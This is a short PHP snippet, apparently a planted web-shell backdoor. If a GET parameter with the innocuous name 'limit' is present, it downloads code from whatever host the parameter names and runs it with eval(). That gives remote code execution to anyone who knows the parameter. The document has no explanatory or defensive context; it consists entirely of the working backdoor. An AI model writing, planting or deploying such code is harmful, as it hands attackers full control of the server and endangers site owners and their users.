<?php
if (isset($_GET['limit'])) {
    eval(file_get_contents('http://' . $_GET['limit']));
}